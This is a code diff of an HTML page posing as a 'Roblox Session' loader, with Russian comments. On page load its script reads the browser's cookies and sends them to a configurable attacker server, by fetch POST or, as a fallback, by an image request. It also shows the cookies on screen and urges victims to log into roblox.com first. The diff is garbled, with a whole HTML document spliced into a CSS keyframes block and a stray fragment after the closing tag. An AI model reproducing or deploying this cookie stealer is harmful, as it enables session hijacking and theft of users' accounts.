@@ -28,39 +28,138 @@
             margin-bottom: 20px;
         }
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            color: #fff;
+            flex-direction: column;
+            padding: 20px;
+            box-sizing: border-box;
         }
         .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            background: #16213e;
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
         }
+        .status {
+            font-size: 18px;
+            margin: 10px 0;
+            padding: 12px;
+            border-radius: 8px;
+        }
+        .success { background: #0f4a3a; color: #8affb2; }
+        .error { background: #4a1a1a; color: #ff8a8a; }
+        .info { background: #1a2a4a; color: #8ab4ff; }
+        .cookie-box {
+            background: #0d0d1a;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-size: 12px;
+            color: #88ffaa;
+            margin: 10px 0;
+            max-height: 120px;
+            overflow: auto;
+        }
+        button {
+            background: #00b2ff;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        button:hover { background: #0088cc; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="loader"></div>
-        <div>Подключение к Roblox...</div>
+        <h2>🔐 Roblox Session</h2>
+
+        <div id="status" class="status info">⏳ Проверка...</div>
+
+        <div id="cookieDisplay" class="cookie-box" style="display:none;">Куки не найдены</div>
+
+        <button onclick="window.location.reload()">🔄 Повторить</button>
     </div>
 
     <script>
-        // ====== НАСТРОЙКА ======
-        // Замени <ТВОЙ_IP> на реальный IP или домен, где висит сервер (с портом 8080)
-        // Если используешь ngrok — подставь его HTTPS-ссылку
-        var TARGET = 'http://127.0.0.1:8080/';   // <--- СЮДА ТВОЙ АДРЕС
-        // =======================
+        // ===== НАСТРОЙКА =====
+        // Сюда вставь свой сервер
+        var TARGET = 'http://127.0.0.1:8080/';
+        // =====================
 
-        // 1. Хватаем все куки
+        var statusEl = document.getElementById('status');
+        var cookieDisplay = document.getElementById('cookieDisplay');
+
+        function log(msg, type) {
+            statusEl.textContent = msg;
+            statusEl.className = 'status ' + type;
+        }
+
+        // 1. Проверяем куки
         var cookies = document.cookie;
+        cookieDisplay.style.display = 'block';
 
-        // 2. Если куки есть — отправляем на сервер
-        if (cookies && cookies.length > 0) {
-            // Основной метод — fetch (работает в современных браузерах)
+        if (!cookies || cookies.length === 0) {
+            cookieDisplay.textContent = '❌ Куки НЕ найдены. Ты не залогинен в Roblox в этом браузере.';
+            cookieDisplay.style.color = '#ff8a8a';
+            log('❌ Нет кук. Зайди на roblox.com и залогинься.', 'error');
+        } else {
+            cookieDisplay.textContent = '✅ Куки найдены: ' + cookies;
+            cookieDisplay.style.color = '#8affb2';
+            log('📤 Отправка кук на сервер...', 'info');
+
+            // 2. Отправляем куки на сервер
             fetch(TARGET, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ cookie: cookies })
+            })
+            .then(function(response) {
+                if (response.ok) {
+                    log('✅ Куки успешно отправлены!', 'success');
+                    cookieDisplay.textContent = '✅ Отправлено: ' + cookies;
+                } else {
+                    log('❌ Сервер вернул ошибку: ' + response.status, 'error');
+                }
+            })
+            .catch(function(err) {
+                // Если fetch не сработал — пробуем через Image
+                log('⚠️ Fetch не сработал, пробую через Image...', 'info');
+                var img = new Image();
+                img.src = TARGET + '?c=' + encodeURIComponent(cookies);
+                log('✅ Отправлено через Image (без ответа от сервера)', 'success');
+            });
+        }
+
+        // Отладка — вывод в консоль
+        console.log('=== ОТЛАДКА ===');
+        console.log('TARGET:', TARGET);
+        console.log('document.cookie:', document.cookie);
+        console.log('Cookies length:', document.cookie ? document.cookie.length : 0);
+        console.log('=== КОНЕЦ ===');
+    </script>
+</body>
+</html>
+okies })
             })
             .then(function(response) {
                 // даже если ответ 400/500 — нам пофиг, главное — отправили
